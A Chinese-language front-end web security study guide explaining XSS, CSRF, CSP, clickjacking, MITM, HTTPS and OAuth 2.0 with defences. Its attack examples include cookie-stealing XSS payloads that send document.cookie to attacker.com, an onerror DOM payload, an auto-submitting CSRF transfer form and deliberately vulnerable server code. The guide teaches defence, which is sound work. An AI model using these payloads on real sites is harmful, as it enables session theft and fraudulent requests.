# 第一层 security（Web 安全）学习文档

---

## 核心要点（TL;DR）

- XSS 的核心是恶意脚本注入，防御关键是输入校验、输出编码、CSP 与 HttpOnly Cookie，避免 `innerHTML` 插入不可信数据。
- CSRF 利用用户已登录身份伪造请求，防御靠 CSRF Token、SameSite Cookie 与双重 Cookie 校验。
- CSP 通过白名单限制可执行脚本与资源来源，是 XSS 纵深防御的重要补充。
- HTTPS/TLS + HSTS 是防止 MITM 与数据窃听的基础，OAuth 2.0 授权码模式配合 PKCE 是安全的第三方授权实践。
- 前端安全需贯穿开发全流程：Cookie 安全属性、依赖审计、响应头配置与最小权限原则缺一不可。

## 学习时长与前置知识

- **建议学习时长**：2-3 周（每周投入 6-8 小时）
- **前置知识**：JavaScript、浏览器、网络基础

## 写在前面

Web 安全就像一座城市的治安系统：再繁华的城市，如果门禁、监控、巡逻、法律任何一环出问题，都可能让不法分子乘虚而入。前端作为用户与系统之间的"第一道城门"，既要保证功能流畅，又要防止恶意代码、伪造请求、信息窃听等攻击。本学习文档将从生活化的比喻出发，系统梳理前端工程师必须掌握的 Web 安全知识，包括 XSS、CSRF、CSP、点击劫持、MITM、HTTPS/TLS、OAuth 2.0 以及前端安全开发规范。

---

## 一、XSS（跨站脚本攻击）

### 1.1 生活中的比喻

想象你去一家咖啡馆，点了一杯拿铁。服务员问你的名字，你回答："我叫小明，顺便帮我在杯子上画一只猫。"服务员真的照做了。但如果一个调皮的人说："我叫 `<script>alert('你被耍了')</script>`"，而服务员不懂得检查，直接把这句话写到了杯子上。当咖啡师拿起杯子准备叫号时，读到这段"脚本"，情不自禁地大声喊了出来——整个咖啡馆都听到了这个弹窗。

这就是 XSS 的本质：**攻击者把恶意脚本注入到网页中，让浏览器在渲染页面时执行了这些脚本**。因为浏览器非常"听话"，只要看到 `<script>` 标签，就会尝试执行里面的代码。

### 1.2 XSS 的三种类型

#### 1.2.1 反射型 XSS

**反射型 XSS** 像"照哈哈镜"：攻击脚本不会长期保存在服务器里，而是通过 URL 参数被"反射"回页面，立刻执行。

**攻击流程：**

1. 攻击者构造一个恶意链接，比如：
   ```
   https://example.com/search?q=<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
   ```
2. 攻击者通过邮件、聊天工具等方式诱骗用户点击该链接。
3. 服务器把这个搜索关键词原样返回给页面。
4. 浏览器渲染时执行了 `<script>` 中的代码，把用户的 Cookie 发送给攻击者服务器。

**代码示例（存在漏洞的服务端伪代码）：**

```js
// 危险写法：直接把用户输入拼接到 HTML 中
app.get('/search', (req, res) => {
  const keyword = req.query.q;
  res.send(`<h1>你搜索了：${keyword}</h1>`);
});
```

如果用户访问 `/search?q=<script>alert(1)</script>`，返回的页面就是：

```html
<h1>你搜索了：<script>alert(1)</script></h1>
```

浏览器会执行 `alert(1)`，换成窃取 Cookie 的代码后果不堪设想。

**防御措施：**

- **输出编码**：把 `<`、`>`、`"`、`'`、`&` 等特殊字符转换成 HTML 实体，比如 `&lt;`、`&gt;`。
- **使用前端框架的内置转义**：React 的 JSX 默认转义插入的内容；Vue 的 `&#123;&#123; &#125;&#125;` 也会转义。
- **不要直接 `innerHTML` 插入不可信数据**：使用 `textContent` 替代。

```js
// 安全写法
const keyword = escapeHtml(req.query.q);
res.send(`<h1>你搜索了：${keyword}</h1>`);
```

---

#### 1.2.2 存储型 XSS

**存储型 XSS** 像"在公共饮水机里下毒"：恶意脚本被长期保存到服务器数据库中，所有访问该页面的用户都会中招。

**攻击流程：**

1. 攻击者在评论区发表一条包含恶意脚本的评论，例如：
   ```html
   这篇文章写得真好！<script>fetch('https://attacker.com/log?c='+document.cookie)</script>
   ```
2. 服务器把这个评论存入数据库。
3. 其他用户查看文章时，服务器从数据库取出这条评论并渲染到页面。
4. 所有看到这条评论的用户的 Cookie 都会被窃取。

**代码示例（存在漏洞的留言板）：**

```js
// 服务端存储评论时不做过滤
app.post('/comment', (req, res) => {
  db.save({ content: req.body.content });
});

// 渲染时直接拼接
app.get('/article/:id', (req, res) => {
  const comments = db.getComments(req.params.id);
  const html = comments.map(c => `<p>${c.content}</p>`).join('');
  res.send(html);
});
```

**防御措施：**

- **输入过滤与输出编码双管齐下**：不要相信任何用户输入，存储时可以保留原始内容，但输出时一定要转义。
- **使用内容安全策略（CSP）**：限制页面可以执行的脚本来源。
- **对富文本内容使用白名单过滤**：例如只允许 `<p>`、`<b>`、`<a>` 等安全标签，禁止 `<script>`、`onerror` 等危险属性。

```js
// 输出时进行 HTML 实体编码
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

---

#### 1.2.3 DOM 型 XSS

**DOM 型 XSS** 像"自己在家煮水时被下毒"：恶意脚本不经过服务器，而是直接通过前端 JavaScript 对 URL 参数、本地存储、Hash 等数据的不安全处理，被写入到页面中。

**代码示例（存在漏洞）：**

```html
<div id="box"></div>
<script>
  // 从 hash 中读取数据并写入页面
  const name = location.hash.slice(1);
  document.getElementById('box').innerHTML = `欢迎你，${name}`;
</script>
```

攻击者诱导用户访问：

```
https://example.com/page.html#<img src=x onerror=alert(document.cookie)>
```

页面会把这个 HTML 片段插入到 DOM 中，图片加载失败后触发 `onerror`，执行恶意代码。

**防御措施：**

- **避免使用 `innerHTML`、`document.write` 插入不可信数据**。
- **使用 `textContent` 或安全的 DOM API**。
- **对来自 URL、localStorage、postMessage 的数据做校验和转义**。

```js
// 安全写法
const name = decodeURIComponent(location.hash.slice(1));
const box = document.getElementById('box');
box.textContent = `欢迎你，${name}`;
```

### 1.3 XSS 防御总结

| 防御手段 | 说明 |
|---------|------|
| 输入校验 | 检查数据格式、长度、类型 |
| 输出编码 | 根据上下文进行 HTML、JS、URL、CSS 编码 |
| CSP | 限制可执行脚本的来源 |
| HttpOnly Cookie | 让 JavaScript 无法读取 Cookie |
| 前端框架转义 | React/Vue/Angular 默认转义插入内容 |
| 白名单过滤 | 富文本场景下只允许安全标签和属性 |

---

## 二、CSRF（跨站请求伪造）

### 2.1 生活中的比喻

你去银行柜台办理转账，银行工作人员认识你，只要你说"转 1000 元给张三"，他就照办。某天，一个小偷在你家门口贴了一张假抽奖单，你填完表后，他偷偷把表格换成"转 1000 元给李四"，然后用你的笔迹签上名，拿到银行去办理。银行一看笔迹是真的，就照办了。

这就是 CSRF：**攻击者诱导用户在已登录状态下，向目标网站发起伪造的请求**。浏览器会自动带上目标网站的 Cookie，服务器误以为是用户本人操作。

### 2.2 攻击流程

1. 用户登录了银行网站 `bank.com`，Cookie 中存在会话标识。
2. 用户没有退出，又访问了恶意网站 `evil.com`。
3. `evil.com` 的页面中隐藏了一个表单或图片：
   ```html
   <form action="https://bank.com/transfer" method="POST" id="csrf-form">
     <input type="hidden" name="to" value="attacker" />
     <input type="hidden" name="amount" value="10000" />
   </form>
   <script>document.getElementById('csrf-form').submit();</script>
   ```
4. 浏览器自动带上 `bank.com` 的 Cookie 发送请求。
5. 银行服务器验证 Cookie 通过，执行转账。

### 2.3 防御措施

#### 2.3.1 CSRF Token

服务器在返回表单时，生成一个随机 Token 并嵌入表单或页面中。提交请求时必须带上这个 Token，攻击者无法伪造。

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="随机字符串" />
  <!-- 其他字段 -->
</form>
```

#### 2.3.2 SameSite Cookie

通过设置 Cookie 的 `SameSite` 属性，限制第三方网站请求时是否携带 Cookie。

```http
Set-Cookie: session_id=xxx; SameSite=Strict; Secure; HttpOnly
```

- `Strict`：完全禁止第三方 Cookie，安全性最高，但可能影响某些正常跳转。
- `Lax`：允许部分安全的顶层导航（如 GET 链接跳转），但不允许 POST 等危险操作，是大多数浏览器的折中默认值。
- `None`：允许第三方 Cookie，必须配合 `Secure` 使用。

#### 2.3.3 双重 Cookie 验证

前端从 Cookie 中读取一个随机值，放到请求头或参数中一并发送。服务器同时校验 Cookie 中的值和请求中的值是否一致。由于同源策略，第三方网站无法读取目标网站的 Cookie，因此无法伪造。

#### 2.3.4 校验 Referer/Origin

服务器检查请求的 `Referer` 或 `Origin` 头，确认请求来自本站点。不过 `Referer` 可能被用户关闭或篡改，只能作为辅助手段。

### 2.4 CSRF 与 XSS 的区别

| 对比项 | XSS | CSRF |
|-------|-----|------|
| 攻击目标 | 在目标网站执行恶意脚本 | 利用用户身份发起伪造请求 |
| 是否需要执行脚本 | 需要 | 不需要 |
| 是否能读取 Cookie | 能（除非 HttpOnly） | 不能直接读取，由浏览器自动携带 |
| 主要防御 | 输入输出编码、CSP | CSRF Token、SameSite Cookie |

---

## 三、CSP（内容安全策略）

### 3.1 生活中的比喻

CSP 就像小区的"访客白名单"系统。物业规定：只有登记过的快递员、亲戚、维修工可以进门，陌生人一律拒之门外。即使有人骗过了门卫（XSS 成功注入了一段脚本），只要不在白名单里，仍然无法进入小区作恶。

### 3.2 基本原理

CSP 通过 HTTP 响应头 `Content-Security-Policy` 告诉浏览器：哪些来源的脚本、样式、图片、字体、连接是被允许的。如果页面中出现不符合策略的资源或脚本，浏览器会拒绝加载或执行。

### 3.3 常用指令

| 指令 | 含义 |
|-----|------|
| `default-src` | 默认资源策略 |
| `script-src` | 允许加载脚本的来源 |
| `style-src` | 允许加载样式的来源 |
| `img-src` | 允许加载图片的来源 |
| `connect-src` | 允许 AJAX/WebSocket 连接的目标 |
| `font-src` | 允许加载字体的来源 |
| `frame-ancestors` | 允许哪些页面嵌入当前页面 |
| `report-uri` / `report-to` | 违规时上报地址 |

### 3.4 配置示例

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  report-uri /csp-report;
```

### 3.5 防御 XSS 的核心用法

**禁止内联脚本**：

```http
Content-Security-Policy: script-src 'self'
```

这样，所有 `<script>` 内联代码和 `onclick` 等事件处理器中的 JS 都会被禁止，即使 XSS 注入了脚本也无法执行。

**使用 Nonce 或 Hash**：

如果必须使用内联脚本，可以给合法的脚本加上随机 Nonce，CSP 中声明该 Nonce：

```http
Content-Security-Policy: script-src 'nonce-2726c7f26c'
```

```html
<script nonce="2726c7f26c">
  console.log('这段脚本是允许的');
</script>
```

攻击者无法预测这个随机 Nonce，因此无法注入合法的内联脚本。

### 3.6 注意事项

- CSP 不是万能的，配置不当可能绕过。
- `'unsafe-inline'` 和 `'unsafe-eval'` 会削弱防护能力，应尽量避免。
- 部署 CSP 前可以先使用 `Content-Security-Policy-Report-Only` 收集违规报告，避免误伤正常功能。

---

## 四、点击劫持（Clickjacking）

### 4.1 生活中的比喻

你去餐厅吃饭，桌上有一层透明玻璃。服务员在玻璃上贴了一张"免费送饮料"的标签，诱导你点击。其实你点击的位置下方，正是"确认支付"按钮。你的点击穿过了玻璃，落到了真正的按钮上。

### 4.2 攻击原理

攻击者用一个 `<iframe>` 嵌入目标网站，并通过 CSS 把目标页面透明化或覆盖在诱导按钮之上。用户以为自己在点击"中奖"按钮，实际上却触发了目标网站的敏感操作。

### 4.3 防御措施

#### 4.3.1 X-Frame-Options

```http
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

- `DENY`：禁止任何页面嵌入本页面。
- `SAMEORIGIN`：只允许同源页面嵌入。

#### 4.3.2 CSP frame-ancestors

```http
Content-Security-Policy: frame-ancestors 'none'
```

或：

```http
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

#### 4.3.3 UI 冗余校验

对于敏感操作，要求用户再次输入密码、进行短信验证，或采用二次确认弹窗。

---

## 五、MITM（中间人攻击）

### 5.1 生活中的比喻

你和朋友约好通过写信交流。但有个邮差偷偷拆开你们的信，看完内容后再重新封好，甚至篡改内容。你们一直以为是直接通信，其实所有信件都经过了邮差之手。

### 5.2 攻击原理

MITM 指攻击者拦截并可能篡改客户端与服务器之间的通信。常见场景包括：公共 Wi-Fi 热点伪造、DNS 劫持、ARP 欺骗等。

### 5.3 危害

- 窃取账号密码、Cookie、银行卡信息。
- 篡改通信内容，插入广告或恶意代码。
- 冒充服务器身份。

### 5.4 防御措施

- **使用 HTTPS/TLS 加密通信**。
- **不要在公共 Wi-Fi 下访问敏感网站**。
- **使用 HSTS（HTTP Strict Transport Security）** 强制浏览器使用 HTTPS：
  ```http
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  ```
- **验证服务器证书**，警惕证书错误提示。

---

## 六、HTTPS/TLS

### 6.1 生活中的比喻

HTTP 就像用透明玻璃瓶装水，任何人都能看到里面是什么。HTTPS 则像用密封的金属保险箱运水，只有收件人有钥匙能打开。TLS 就是这把锁的制造工艺。

### 6.2 HTTPS 解决了什么问题

- **窃听风险**：加密通信内容，防止 MITM 窃取数据。
- **篡改风险**：通过 MAC（消息认证码）检测数据是否被篡改。
- **冒充风险**：通过数字证书验证服务器身份。

### 6.3 TLS 握手简化流程

1. 客户端向服务器发送支持的加密算法列表和随机数。
2. 服务器返回证书、选定的加密算法、服务器随机数。
3. 客户端验证证书，生成预主密钥，用服务器公钥加密后发送。
4. 双方根据预主密钥和随机数生成会话密钥。
5. 后续通信使用会话密钥对称加密。

### 6.4 证书与 CA

数字证书由受信任的证书颁发机构（CA）签发，包含服务器公钥、域名、有效期等信息。浏览器内置了受信任的 CA 根证书，可以验证证书链。

**自签名证书**就像自己给自己写介绍信，无法被浏览器信任，只适用于测试环境。

### 6.5 前端需要注意什么

- 所有资源（图片、CSS、JS、API）都应使用 HTTPS，避免"混合内容"警告。
- 设置 HSTS 头，防止 SSL 剥离攻击。
- 使用安全的 TLS 版本（TLS 1.2 及以上），禁用 SSL 3.0、TLS 1.0/1.1。
- 部署证书时检查是否过期、是否正确配置中间证书。

---

## 七、OAuth 2.0

### 7.1 生活中的比喻

你想去一家健身房办卡，但不想在健身房单独注册账号。健身房说："你可以用微信登录。"你扫码授权后，微信给健身房发了一张"临时通行证"，上面写着"此人身份已核实，有效期 7 天，但请不要问我他的微信密码"。健身房拿到通行证后，可以获取你的昵称和头像，但无法登录你的微信。

### 7.2 为什么需要 OAuth 2.0

在第三方应用需要访问用户资源（如头像、通讯录、网盘文件）时，直接告诉第三方自己的密码非常危险。OAuth 2.0 提供了一种**授权**机制：用户让第三方应用获得一个有时效、有限权限的令牌，而不用泄露密码。

### 7.3 四种授权模式

| 模式 | 适用场景 |
|-----|---------|
| 授权码模式（Authorization Code） | 最常见、最安全，用于有后端的 Web/App |
| 简化模式（Implicit） | 用于纯前端应用，现在已被 PKCE 取代 |
| 密码凭证模式（Password Credentials） | 仅适用于高度信任的客户端 |
| 客户端凭证模式（Client Credentials） | 用于服务之间的调用 |

### 7.4 授权码模式流程

1. 用户点击"使用 GitHub 登录"。
2. 前端将用户重定向到授权服务器：
   ```
   https://github.com/login/oauth/authorize?client_id=xxx&redirect_uri=yyy&scope=user&state=随机值
   ```
3. 用户在授权服务器登录并同意授权。
4. 授权服务器重定向回 `redirect_uri`，并附带授权码和 `state`：
   ```
   https://app.com/callback?code=abc123&state=随机值
   ```
5. 前端把授权码发送给己方后端。
6. 后端用 `client_id` + `client_secret` + `code` 向授权服务器换取 Access Token。
7. 后端用 Access Token 获取用户信息，完成登录。

### 7.5 前端安全要点

- **`state` 参数必须随机且校验**：防止 CSRF 攻击，攻击者无法预测 `state`。
- **不要把 `client_secret` 放在前端代码中**。
- **使用 PKCE 扩展**：在移动应用和 SPA 中，用 PKCE 防止授权码被截获。
- **Access Token 妥善保管**：避免存储在 localStorage 中（易被 XSS 窃取），可考虑 httpOnly Cookie 或内存中短期保存。
- **校验 redirect_uri 白名单**：防止授权码被发送到攻击者控制的地址。

---

## 八、前端安全开发规范

### 8.1 输入与输出

- **所有用户输入都是不可信的**：包括 URL 参数、表单数据、Cookie、localStorage、postMessage、WebSocket 消息等。
- **在输出点做编码**：不同上下文使用不同编码方式。
  - HTML 上下文：`escapeHtml`
  - JavaScript 上下文：`JSON.stringify`
  - URL 上下文：`encodeURIComponent`
  - CSS 上下文：严格限制输入内容

### 8.2 DOM 操作安全

- 优先使用 `textContent` 而不是 `innerHTML`。
- 避免使用 `eval()`、`new Function()`、`setTimeout(string)` 等执行字符串代码。
- 对动态生成的 HTML，使用模板引擎或框架的安全插值。

### 8.3 Cookie 安全

```http
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Lax
```

- `HttpOnly`：防止 JavaScript 读取 Cookie，降低 XSS 损失。
- `Secure`：只在 HTTPS 连接中传输 Cookie。
- `SameSite`：防止 CSRF。

### 8.4 依赖安全

- 定期检查 npm 依赖漏洞：`npm audit`。
- 及时升级有安全问题的包。
- 避免使用来路不明的第三方脚本，尤其是直接嵌入 CDN 的 JS。

### 8.5 安全配置

- 配置 CSP、X-Frame-Options、HSTS、X-Content-Type-Options 等安全响应头。
- 关闭不必要的 HTTP 方法（如 TRACE、OPTIONS 滥用）。
- 使用 CORS 时严格限制 `Access-Control-Allow-Origin`，避免使用 `*` 配合携带凭证。

### 8.6 认证与授权

- 不要把敏感信息（密码、Token、密钥）硬编码在前端代码中。
- 前端校验只是提升体验，真正的校验必须在后端完成。
- Token 过期后要及时清除并重新登录。

---

## 九、总结

Web 安全是一个系统工程，前端开发者需要建立"纵深防御"的思维：

1. **XSS** 的防御核心在于"输入过滤、输出编码"，辅以前端框架转义、CSP、HttpOnly Cookie。
2. **CSRF** 的防御核心在于"验证请求来源"，常用 CSRF Token、SameSite Cookie、双重 Cookie。
3. **CSP** 是 XSS 的有力补充，通过白名单限制资源加载和脚本执行。
4. **点击劫持** 通过 `X-Frame-Options` 和 `frame-ancestors` 防止页面被恶意嵌入。
5. **MITM** 的防御核心是使用 HTTPS/TLS 加密通信，并配合 HSTS。
6. **OAuth 2.0** 实现了安全的第三方授权，但要注意 `state`、PKCE、Token 保管等细节。
7. **前端安全开发规范** 贯穿日常编码，从输入输出到 Cookie、依赖、响应头都需要谨慎处理。

安全没有银弹，也没有终点。保持警惕、持续学习、定期审计，才能让我们的应用真正稳健可靠。

---

## 延伸阅读

- OWASP Top 10
- MDN：Content Security Policy (CSP)
- MDN：SameSite Cookie
- RFC 6749：The OAuth 2.0 Authorization Framework
- RFC 7636：Proof Key for Code Exchange by OAuth Public Clients (PKCE)

---

> **领域编号**：F05 Web 安全  
> **最后更新**：2026-06-18


---

## 本领域学习进度

<MarkComplete domainId="security" />
<ProgressTracker />
